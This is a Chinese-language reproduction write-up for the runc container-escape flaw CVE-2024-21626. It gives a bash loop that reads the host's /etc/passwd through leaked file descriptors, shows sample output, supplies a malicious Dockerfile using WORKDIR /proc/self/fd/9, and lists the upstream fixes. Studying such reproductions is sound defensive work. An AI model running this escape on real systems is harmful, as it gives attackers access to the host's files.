漏洞复现

- https://www.ddosi.org/cve-2024-21626/
- https://mp.weixin.qq.com/s/kMmeMusedbd1oeozUrX2gQ
- https://labs.withsecure.com/publications/runc-working-directory-breakout--cve-2024-21626

1、复现环境：

uname -a
Linux localhost.localdomain 5.10.0-136.12.0.88.ctl3.x86_64 #1 SMP Fri Jul 28 08:13:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

系统：ctyunos-23.01-230117-x86_64-dvd.iso

docker版本：
    Client:
    Version:           20.10.12

    runc:
    Version:          1.1.4


2、复现步骤

2.1 确定本机上泄露的文件描述符

```shell
#! /bin/bash
for i in {4..20}; do
docker run -it --rm -w /proc/self/fd/$i ubuntu:18.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
done
```


失败的情况：
docker: Error response from daemon: failed to create shim: OCI runtime create failed: runc create failed: unable to start container process: error during container init: mkdir /proc/self/fd/8: not a directory: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.


成功的情况：
ERRO[0000] error waiting for container: context canceled 
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown

根据以上情况确定本机上泄露的描述符为9

2.2 恶意docker镜像

替换dockerfile中的WORKDIR 中的ID

```
FROM ubuntu:18.04
RUN apt-get update -y && apt-get install netcat -y

WORKDIR /proc/self/fd/9
```


2.3 构建镜像

docker  build .  -t cve-2024-21626


2.3 执行容器逃逸

docker run -it --rm cve-2024-21626 bash

成功后，可以访问到宿主机目录文件，当前的工作目录是宿主机/sys/fs/cgroup。



3. 漏洞修复

a. 检查工作目录是否确实在容器内部（通过os.Getwd命令是否返回ENOENT来检查）。这会显式阻止 runC 在非容器工作目录中执行容器进程，从而消除前述提到的攻击方式1 和 2的威胁，即使在 fd 泄漏的情况下也是如此。

b. 在runC init的最后阶段和execve之前关闭所有内部 runC 文件描述符。这确保了内部文件描述符不能被用作execve的参数，从而消除攻击 3a 和 3b的威胁（即使在 fd 泄漏的情况下也同样有效）。

c. 修复导致这些漏洞可被利用的特定 fd 泄漏（标记/sys/fs/cgroup为O_CLOEXEC）。

d. 在执行runC init之前标记所有非 stdio 文件为O_CLOEXEC，以防止未来还有runC init文件描述符泄漏。